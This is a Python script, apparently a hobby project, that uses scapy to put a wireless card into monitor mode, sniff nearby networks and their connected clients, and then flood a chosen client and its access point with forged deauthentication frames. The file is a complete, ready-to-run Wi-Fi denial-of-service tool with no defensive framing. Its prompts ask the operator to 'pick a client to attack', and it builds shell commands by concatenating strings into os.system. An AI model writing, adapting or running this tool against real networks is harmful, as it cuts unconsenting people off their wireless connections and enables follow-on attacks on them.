import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap

network_list = {}

'''
This class represents an object of type Network of wireless network
'''


class Network:
    def __init__(self, bssid, mac, chanel):
        self.bssid = bssid
        self.mac = mac
        self.chanel = chanel
        self.users = []

    def net_info(self):
        return f"bssid: {self.bssid}, MAC:{self.mac}, channel: {self.chanel}"

    def get_users(self):
        return self.users

    def add_user(self, user_mac):
        self.users.append(user_mac)

    def display_users(self):
        print("users in this network:")
        for user in range(0, len(self.users)):
            print(f"{user + 1} {self.users[user]}\n")

    def get_mac(self):
        return self.mac


'''
scans all interfaces 
'''


def iface_list():
    if_list = netifaces.interfaces()
    return if_list


'''
Set interface into monitor mode
'''


def monitorMode(iface):
    os.system("ifconfig " + iface + " down")
    os.system("iwconfig " + iface + " mode monitor")
    os.system("ifconfig " + iface + " up")


'''
Handels the packet caught by the interface by seperating it to sender and reciver packets
'''


def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        dot11_layer = pkt[Dot11]
        if dot11_layer.addr2 and (dot11_layer.addr2 not in network_list.keys()):
            bssid = pkt[Dot11].info
            channel = int(ord(pkt[Dot11Elt:3].info))
            mac = dot11_layer.addr2
            new_network = Network(bssid, pkt[Dot11].addr2, channel)
            new_duo = {mac: new_network}
            network_list.update(new_duo)
    else:
        sn = pkt.getlayer(Dot11).addr2
        rc = pkt.getlayer(Dot11).addr1
        if sn in network_list.keys():
            net = network_list.get(sn)
            if rc not in net.get_users():
                net.add_user(rc)
        if rc in network_list.keys():
            net = network_list.get(rc)
            if sn not in net.get_users():
                net.add_user(sn)


'''
sniffs for packets using selected interface
'''


def start_sniffer(interface):
    os.system("clear")
    for channel in range(1, 13):
        print("\U0001F634")
        os.system("iwconfig %s channel %d" % (interface, channel))
        sniff(iface=interface, timeout=5, prn=packet_handler)


'''
sends deauth packets to selected user on selected network
'''


def perform_deauth(router, client, iface):
    pckt = RadioTap() / Dot11(addr1=client, addr2=router, addr3=router) / Dot11Deauth(reason=4)
    cli_to_ap_pckt = RadioTap() / Dot11(addr1=router, addr2=client, addr3=client) / Dot11Deauth(reason=7)

    print('Sending Deauth to ' + client + ' from ' + router)

    try:
        for i in range(100):
            sendp(pckt, inter=0.1, count=1, loop=0, iface=iface, verbose=0)
            sendp(cli_to_ap_pckt, inter=0.1, count=1, loop=0, iface=iface, verbose=0)
            print("\U0001F608")

    except Exception as e:
        print(f"error: {e}")


if __name__ == '__main__':
    # Display all available interface
    user_iface = None

    print("Available interfaces:")
    if_list = iface_list()
    for i in range(0, len(if_list)):
        print(i + 1, if_list[i])
    flag = True
    while (flag):
        user_choice = input("Please pick an interface:\n ")
        while int(user_choice) < 1 or int(user_choice) > len(if_list):
            user_choice = input("Interface has to be in the range seen above\nPlease pick an interface from the "
                                "listed numbers")

        print(user_choice)
        user_iface = if_list[int(user_choice) - 1]

        print('Setting interface into monitor mode...\n')
        try:
            monitorMode(user_iface)
            flag = False
        except:
            print("Could not change interface mode to monitor.")

    # Checking and displaying available networks
    print("Sniffing for available networks for 60 seconds...")
    start_sniffer(user_iface)
    for net in range(0, len(network_list)):
        obj = list(network_list)[net]
        net_inf = network_list.get(obj).net_info()
        print(f"{net + 1} {net_inf}")

    # let user pick network - check number is valid
    user_choice = input("Please pick a network: \n")
    while int(user_choice) < 1 or int(user_choice) > len(network_list):
        user_choice = input(
            "Network has to be in the range seen above\n Please pick an network from the listed numbers")

    user_key = list(network_list)[int(user_choice) - 1]
    user_network = network_list.get(user_key)

    print(f"swiching to channel number {user_network.chanel}")
    os.system("iwconfig %s channel %d" % (user_iface, user_network.chanel))

    # display all users in network
    user_network.display_users()

    # let user pick who to attak
    user_choice = input("please pick a client to attack: \n")
    while int(user_choice) < 1 or int(user_choice) > len(user_network.get_users()):
        user_choice = input("User has to be in the range seen above\n Please pick a user from the listed numbers")

    client_to_attack = user_network.get_users()[int(user_choice) - 1]
    print(f"will be attacking {client_to_attack}\n")

    # deauth
    perform_deauth(user_network.get_mac(), client_to_attack, user_iface)
    print("Attack is done. goodbye!")
